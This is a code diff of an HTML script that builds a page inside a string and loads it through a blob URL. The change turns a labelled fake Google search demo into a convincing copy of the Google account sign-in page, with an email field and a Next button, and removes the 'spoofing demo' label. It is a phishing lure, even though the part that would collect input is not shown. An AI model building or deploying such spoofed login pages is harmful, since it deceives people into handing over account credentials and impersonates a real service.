@@ -1,58 +1,82 @@
 <script>
 var exp = `<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Google</title>
+  <meta charset="UTF-8">
+  <title>Sign in – Google accounts</title>
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: Roboto, Arial, sans-serif;
       background: #fff;
-      color: #202124;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      color: #202124;
+    }
+    .container {
+      width: 360px;
+      padding: 40px 30px;
+      box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15);
+      border-radius: 8px;
     }
     .logo {
-      margin-bottom: 40px;
+      text-align: center;
+      margin-bottom: 30px;
     }
     .logo img {
-      width: 272px;
-      height: 92px;
+      width: 75px;
     }
-    .search-bar {
-      width: 560px;
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 10px;
+    }
+    .input-field {
+      margin-top: 20px;
       display: flex;
-      border: 1px solid #dfe1e5;
-      border-radius: 24px;
-      padding: 10px 20px;
-      box-shadow: 0 1px 6px rgba(32,33,36,.28);
+      flex-direction: column;
     }
-    .search-bar input {
-      border: none;
-      outline: none;
-      flex: 1;
+    input {
       font-size: 16px;
+      padding: 10px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+    }
+    .btn {
+      margin-top: 30px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
     }
     .footer {
-      position: absolute;
-      bottom: 20px;
-      font-size: 14px;
-      color: #70757a;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #5f6368;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <div class="logo">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
-  </div>
-  <div class="search-bar">
-    <input type="text" placeholder="Search Google or type a URL">
-  </div>
-  <div class="footer">
-    Fake Google UI for spoofing demo
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" alt="Google">
+    </div>
+    <h1>Sign in</h1>
+    <div>to continue to Google</div>
+    <div class="input-field">
+      <label for="email">Email or phone</label>
+      <input id="email" type="email" placeholder="">
+    </div>
+    <button class="btn">Next</button>
+    <div class="footer">Not your computer? Use Guest mode to sign in privately.</div>
   </div>
 
   <script>
@@ -60,6 +84,5 @@ var exp = `<!DOCTYPE html>
   <\/script>
 </body>
 </html>`;
-
 location = URL.createObjectURL(new Blob([exp], {type: "text/html"}));
 </script>
